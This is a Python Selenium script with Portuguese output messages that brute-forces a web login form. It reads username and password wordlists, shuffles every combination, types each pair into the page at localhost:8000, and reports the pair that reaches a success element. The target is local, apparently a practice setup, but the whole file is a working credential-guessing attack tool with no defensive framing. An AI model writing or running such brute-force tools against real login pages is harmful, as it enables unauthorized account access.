import os
import sys
import time
from random import shuffle
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.action_chains import ActionChains

from selenium.common.exceptions import NoSuchElementException

def readusers(users_file):
    usernames = []
    with open(users_file, 'r') as f:
        usernames = list(map(str.rstrip, f.readlines()))
    return usernames

def readpasswd(passwd_file):
    passwd = []
    with open(passwd_file, 'r') as f:
        passwd = list(map(str.rstrip, f.readlines()))
    return passwd

def authenticate(username, passwd, user_element, passwd_element, submit_element, driver):
    try:
        u = driver.find_element_by_name(user_element)		
        p = driver.find_element_by_name(passwd_element)
        
        u.clear()
        p.clear()

        u.click()
        u.send_keys(username)		
        p.click()
        p.send_keys(passwd)
        p.send_keys(Keys.ENTER)
        driver.execute_script('validate_login()')
        # button = driver.find_element_by_name(submit_element)
        # button.click()
    except:
        pass

if __name__ == '__main__':
    url='http://localhost:8000'
    userfile = 'userlist.txt'
    passwdfile = 'passwdlist10.txt'
    user_field = 'username'
    passwd_field = 'pass'
    submit_button = 'button'
    driver = webdriver.Safari(executable_path=r'/usr/bin/safaridriver')
    
    driver.get(url)
    time.sleep(2)
    users = readusers(userfile)
    passwd = readpasswd(passwdfile)
    count = 0
    tries = [(u,p) for u in users for p in passwd]
    shuffle(tries)
    for u,p in tries:
        count += 1
        try:
            driver.find_element_by_id('sucesso')
            print('SUCESSO na tentativa #{}: (login: {}, senha: {})'.format(count, u, p))
            time.sleep(10)
            driver.quit()
            sys.exit(0)
        except NoSuchElementException:
            pass
        authenticate(u, p, user_field, passwd_field, submit_button, driver)
        print('Tentativa #{}: (login: {}, senha: {})'.format(count, u, p))
            
